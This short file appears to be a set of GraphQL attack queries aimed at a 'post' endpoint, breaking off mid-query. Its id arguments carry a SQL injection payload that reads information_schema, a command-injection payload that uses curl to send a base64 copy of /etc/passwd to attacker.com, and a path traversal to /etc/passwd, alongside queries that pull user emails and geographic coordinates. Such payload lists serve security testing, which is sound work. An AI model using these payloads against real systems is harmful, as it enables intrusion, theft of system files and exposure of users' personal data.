query.query:
query post(id: "1' UNION SELECT NULL,table_name FROM information_schema.tables--") {
  post
  title
  user {
    username
  }
}

query post(id: "1; $(curl attacker.com?c=$(cat /etc/passwd|base64)) #") {
  post
  user {
    address {
      city
    }
  }
}

query post(id: "../../../../etc/passwd") {
  post
  comments {
    data {
      body
    }
  }
}

query post(id: "1") {
  post
  user {
    email
    address {
      geo {
        lat
      }
    }
  }
}

query {
  sensitive: post(id: "1") {
    id
    user {
      a: email
